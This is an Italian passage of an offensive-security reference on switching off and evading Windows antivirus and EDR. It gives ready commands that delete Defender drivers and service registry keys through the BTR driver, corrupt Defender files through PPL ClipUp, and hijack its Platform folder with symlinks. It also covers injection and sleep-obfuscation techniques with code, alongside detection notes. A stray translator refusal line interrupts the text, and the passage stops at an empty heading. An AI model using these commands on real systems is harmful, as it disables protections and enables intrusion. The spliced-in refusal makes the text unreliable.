Gli ID di azione accettati espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell'elemento | Risultato |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Elimina un file, anche se bloccato |
| 2 | `[UTF-16 path]` | Rimuove una directory vuota |
| 3 | `[Flags][source][destination]` | Sposta un file in un percorso protetto scelto dall'attaccante; una destinazione vuota comporta l'eliminazione |
| 4 | `[Flags][key path]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[Flags][key path + "\\" + value]` | Elimina un valore del registro |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Crea/aggiorna un valore del registro e crea i percorsi delle chiavi mancanti |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è composto da **due backslash consecutivi**; un percorso formattato secondo la convenzione non verrà suddiviso correttamente. Il file di feedback rispecchia in gran parte la richiesta, ma i primi quattro byte dei dati di ogni elemento diventano il relativo `NTSTATUS` risultante. Per le azioni 1 e 2, che non hanno un campo iniziale per i flag, BTR sposta il percorso nei quattro byte riservati finali per fare spazio a tale stato.<sup>[[36]](#references)</sup>

### Flusso di lavoro di `BTR_CLI` e finestra di avvio anticipato

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l'intera catena: estrae `BTR.sys` da Defender installato localmente, crea `<random>.sys:changelist` e uno stream di feedback, serializza/verifica il checksum/cifra azioni concatenate, crea direttamente la chiave di registro del servizio, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver di avvio del sistema con `-trigger boot`. La configurazione diretta del registro evita il normale percorso SCM `CreateServiceW` e quindi **non genera l'evento 7045 di installazione del servizio**. Gli artefatti attivati all'avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry` prima che lo stack di archiviazione e il collegamento `SystemRoot` siano pronti. `Start=1`, insieme al gruppo `Boot Bus Extender` ad alta priorità, viene invece eseguito nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza con avvio di sistema e servizi EDR in modalità utente non sono ancora stati inizializzati. I filtri con avvio all'avvio, come `WdFilter`, potrebbero essere già caricati, ma BTR può rimuoverne i binari o la configurazione del servizio prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. La PoC antepone l'Azione 1 per il percorso hardcoded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, poi elabora la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le tracce, mentre inserire il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due flussi.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni di rilevamento ad alto segnale

Le regole basate solo sulla firma e la blocklist Microsoft dei driver vulnerabili non contrastano l'abuso delle funzionalità previste di BTR. È preferibile usare queste correlazioni comportamentali, distinguendo al contempo la normale discendenza di Defender da un launcher qualsiasi.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale nella preparazione di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, perché Defender normalmente inserisce il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correlare la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` con l'assenza del corrispondente evento di installazione SCM.
- **Sysmon 6 -> 23:** correlare il caricamento di un driver BTR noto da una discendenza non-Defender con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare se riguarda binari di sicurezza.
- **Sysmon 11 -> 23:** generare un avviso per la rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limitare e verificare l'assegnazione/l'abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft, da sola, non è sufficiente a garantire l'affidabilità quando il driver di uno strumento di sicurezza viene preparato da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBIN

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli, in modo che solo i processi protetti con livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, puoi trasformare funzionalità innocue (ad es. la registrazione) in una primitiva di scrittura limitata, supportata da PPL, contro le directory protette usate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa serve perché un processo venga eseguito come PPL
- L'EXE di destinazione (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari antimalware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Livelli errati impediranno la creazione.

Vedi anche una panoramica più ampia di PP/PPL e della protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti launcher
- Helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schema di utilizzo:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Non posso tradurre istruzioni operative per aggirare le protezioni PPL e corrompere file antivirus. Posso però fornire un riassunto sicuro: il testo descrive un abuso di un binario Windows firmato per scrivere in directory protette e impedire l’avvio dell’antivirus.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare il contenuto che ClipUp scrive, ma solo dove lo scrive; questa primitiva è adatta alla corruzione, non all’iniezione precisa di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il tempismo è fondamentale: il target non deve essere aperto; l’esecuzione all’avvio evita i blocchi dei file.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, specialmente se avviato da launcher non standard durante l’avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che si avviano regolarmente prima di Defender/AV. Esamina la creazione/modifica dei servizi prima degli errori di avvio di Defender.
- Monitoraggio dell’integrità dei file dei binari di Defender e delle directory Platform; creazioni/modifiche inattese da parte di processi con flag di processo protetto.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali processi padre; blocca l’esecuzione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei servizi: limita la creazione/modifica dei servizi ad avvio automatico e monitora la manipolazione dell’ordine di avvio.
- Assicurati che la protezione antimanomissione di Defender e le protezioni di early launch siano abilitate; esamina gli errori di avvio che indicano la corruzione dei binari.
- Valuta di disabilitare la generazione di nomi brevi 8.3 nei volumi che ospitano strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Manomissione di Microsoft Defender tramite dirottamento di symlink della cartella della versione Platform

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad es. `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si basa sulle voci delle directory, inclusi i reparse point di directory (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender a un percorso scrivibile da un attacker e ottenere DLL sideloading o causare un’interruzione del servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare o attivare una nuova selezione della piattaforma di Defender (riavvio del servizio all’avvio)
- Sono necessari solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della piattaforma si basa sulle voci delle directory e sceglie la versione lessicograficamente più alta senza verificare che il target punti a un percorso protetto/attendibile.

Procedura dettagliata (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale percorso.

Opzioni di post-exploitation
- DLL sideloading/code execution: inserisci/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: rimuovi il symlink della versione, così al successivo avvio il percorso configurato non sarà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Nota che questa tecnica non consente di per sé la privilege escalation; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare la runtime evasion dal C2 implant al modulo target stesso, agganciando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall’attaccante. Questo estende la tecnica di evasion oltre la ridotta superficie API esposta da molti kit (ad es., CreateProcessA) e applica le stesse protezioni anche a BOF e DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio generale
- Caricare uno stage PIC accanto al modulo target tramite un reflective loader (anteposto o come modulo companion). Il PIC deve essere autonomo e position-independent.
- Quando la DLL host viene caricata, scorrere il suo IMAGE_IMPORT_DESCRIPTOR e modificare le voci IAT delle importazioni target (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a wrapper PIC sottili.
- Ogni wrapper PIC esegue le evasion prima di effettuare una tail-call all’indirizzo dell’API reale. Le evasion tipiche includono:
  - Mascheramento/ripristino della memoria durante la chiamata (ad es., cifrare le regioni del beacon, passare da RWX a RX, modificare i nomi/le autorizzazioni delle pagine), quindi ripristinarla dopo la chiamata.
  - Call-stack spoofing: costruire uno stack innocuo e passare all’API target in modo che l’analisi del call stack individui i frame previsti.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un’interfaccia che permetta a uno script Aggressor (o equivalente) di registrare quali API agganciare per Beacon, BOF e DLL post-ex.

Perché usare l’IAT hooking
- Funziona con qualsiasi codice che utilizzi l’importazione agganciata, senza modificare il codice dello strumento né dipendere da Beacon per fare da proxy a API specifiche.
- Copre le DLL post-ex: agganciare LoadLibrary* consente di intercettare i caricamenti dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare lo stesso mascheramento/stack evasion alle relative chiamate API.
- Ripristina un uso affidabile dei comandi post-ex che avviano processi contro i rilevamenti basati sul call stack, tramite wrapper per CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocazioni/ASLR e prima del primo utilizzo dell’import. Loader reflective come TitanLdr/AceLdr dimostrano l’hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e compatibili con PIC; risolvi la vera API tramite il valore originale dell’IAT acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine scrivibili ed eseguibili.

Call-stack spoofing stub
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (con indirizzi di ritorno in moduli benigni) e poi trasferiscono il controllo alla vera API.
- Questo elude i rilevamenti che si aspettano stack canonici da Beacon/BOF per le API sensibili.
- Combinali con tecniche di stack cutting/stack stitching per arrivare ai frame attesi prima del prologo dell’API.

Integrazione operativa
- Anteponi il loader reflective alle DLL post-ex, così che PIC e hook vengano inizializzati automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target, in modo che Beacon e i BOF possano beneficiare in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni per il rilevamento/DFIR
- Integrità dell’IAT: voci che puntano a indirizzi non appartenenti a immagini (heap/anonimi); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; transizioni improvvise a PIC non appartenente a immagini; genealogia RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process nell’IAT, attività iniziale di DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di mascheramento della memoria.

Componenti riutilizzabili ed esempi
- Loader reflective che eseguono il patching dell’IAT durante il caricamento (ad es. TitanLdr, AceLdr)
- Hook di memory masking (ad es. simplehook) e PIC per stack cutting (stackcutting)
- Stub PIC per call-stack spoofing (ad es. Draugr)


## Hooking dell’IAT al caricamento degli import + sleep obfuscation (Crystal Palace/PICO)

### Hook IAT al caricamento degli import tramite un PICO residente

Se controlli un loader reflective, puoi applicare gli hook agli import **durante** `ProcessImports()` sostituendo il puntatore a `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva alla liberazione del PIC transitorio del loader.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver degli import del loader (ad es. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con voci Crystal Palace `addhook "MODULE$Func" "hook"`. L’hook rimane valido perché risiede nel PICO residente.

Questo permette il **reindirizzamento dell’IAT al caricamento degli import** senza modificare la sezione di codice della DLL caricata dopo il caricamento.

### Forzare gli import intercettabili quando il target usa il PEB-walking

Gli hook al caricamento degli import si attivano solo se la funzione è effettivamente presente nell’IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza una voce di import), forza un import reale affinché il percorso `ProcessImports()` del loader lo rilevi:

- Sostituisci la risoluzione degli export tramite hash (ad es. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l’intercettazione quando il loader reflective risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza modificare `Sleep()`

Invece di modificare `Sleep`, fai hooking delle **primitive effettive di attesa/IPC** usate dall’impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l’immagine in memoria durante l’inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che invocano `NtContinue` con frame `CONTEXT` predisposti.
- Catena tipica (x64): imposta l’immagine su `PAGE_READWRITE` → cifrala con RC4 tramite `advapi32!SystemFunction032` sull’intera immagine mappata → esegui l’attesa bloccante → decifrala con RC4 → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` modello; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese lunghe (ad es. `WAIT_OBJECT_0`), così il chiamante continua mentre l’immagine è mascherata. Questo schema nasconde il modulo agli scanner durante le finestre di inattività ed evita la classica signature di `Sleep()` modificata.

Idee per il rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- Uso di `advapi32!SystemFunction032` su buffer contigui di grandi dimensioni, pari alla dimensione dell’immagine.
- `VirtualProtect` applicato a un intervallo ampio, seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG a runtime per i gadget di sleep-obfuscation

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, in genere provoca il crash del processo con `STATUS_STACK_BUFFER_OVERRUN` perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi hardenizzati:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all’interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare alla **base dell’immagine** e coprire **l’intera dimensione dell’immagine**.
- Per le regioni mappate manualmente/PIC/stomped, usa invece la **base dell’allocazione** e la dimensione dell’allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, chiamate di sistema di attesa/evento) e tutte le sezioni eseguibili controllate dall’attaccante che diventeranno target indiretti.

In questo modo le catene di sleep in stile ROP/JOP passano da “funziona solo nei processi senza CFG” a una primitiva riutilizzabile per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per i thread in attesa

La sostituzione completa di `CONTEXT` è rumorosa e può causare problemi sui sistemi CET Shadow Stack, perché un `Rip` falsificato deve comunque corrispondere allo shadow stack hardware. Un pattern più sicuro per il sleep masking è:<sup>[[30]](#references)</sup>

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack del suo `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in attesa con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto falsificato, lasciando intatto lo stato `Rsp`/stack falsificato.
- Durante la finestra di attesa, copia l’`NT_TIB` del thread falsificato nel TEB corrente, così che gli stack walker effettuino l’unwind all’interno di un intervallo di stack legittimo.
- Al termine dell’attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un instruction pointer coerente con CET e inganna gli stack walker EDR che si affidano ai metadati dello stack del TEB per convalidare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue ha troppe signature, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un thread helper sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC predisposti con `NtQueueApcThread` e svuotali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell’heap anziché nello stack dell’helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l’evento di avvio e bloccare il thread.
- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → ripristino → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe rilevare uno stack ripristinato solo in parte.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature basata su thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e stack spoofing.

Ulteriori idee per il rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` usati attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack del TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di signature brevi di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all’interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata nel processo target**, anziché allocare memoria eseguibile privata facilmente individuabile o caricare una nuova DLL sacrificale. Il target di sovrascrittura dovrebbe essere un’**immagine caricata e basata su disco**, il cui spazio di codice possa contenere il payload senza corrompere percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Lo stomping ingenuo su moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola potrebbe causare il crash del processo. Un flusso di lavoro più affidabile è:

1. Enumera i moduli del processo target e conserva una **lista di inclusione composta solo da nomi** delle DLL già caricate.
2. Crea prima il payload e annotane la **dimensione esatta in byte**.
3. Scansiona le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file perché riflette la dimensione della sezione eseguibile **quando viene mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l’RVA di una funzione esportata come offset iniziale per lo stomp.
5. Calcola il **raggio d’impatto**: se il payload supera i limiti della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper di ricognizione/selezione tipici osservati in the wild:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
- Preferisci DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/dei caricamenti inattesi di immagini.
- Preferisci export eseguiti raramente dall'applicazione target; altrimenti, i normali percorsi del codice potrebbero raggiungere i byte sovrascritti prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di modificare l'incorporamento dello shellcode da string literal a **byte-array/braced initializer**, in modo che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in pagine eseguibili supportate da immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece che nelle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di supporto su disco.
- Thread remoti o context pivot che iniziano l'esecuzione all'interno di un export di una DLL legittima i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` su pagine `.text` di DLL seguite dalla creazione di thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` ed è limitato a **32,767 caratteri Unicode**, terminatore null incluso.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe `NAME=VALUE\0` consecutive e terminato da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la mappatura `ShellInfo` dovrebbe essere considerata un dettaglio di implementazione, non un contratto documentato stabile.

In questo modo, la normale creazione di processi diventa la **primitiva per il trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che Windows esegua la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, individua il buffer copiato usando primitive di **sola lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → recupera `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi la `PEB` remota
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare il processo normalmente (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivere `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente usando l'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei byte nulli e shellcode a fasi

Tutti e tre i carrier sono dati **stringa o simili a stringhe**, quindi un payload grezzo contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stage senza byte nulli**, che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice consiste nella sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al first stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader di shellcode second-stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/buffer nello stack del processo target
- riservare i **32 byte di shadow space x64**
- impostare `RCX`, `RDX`, `R8`, `R9` con costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, impostato su `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto con un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono eseguibili le **pagine dei parametri di processo**
- la modifica delle protezioni seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote di `PEB` e poi di `RTL_USER_PROCESS_PARAMETERS`
- valori di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved insolitamente lunghi o ad alta entropia durante la creazione del processo

### Note

- P3 è un **trucco per il trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato richiede comunque una modifica dei permessi di esecuzione e un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato preso in considerazione dagli autori, ma scartato perché internamente arriva a primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Injection tramite pipe STDIN della console

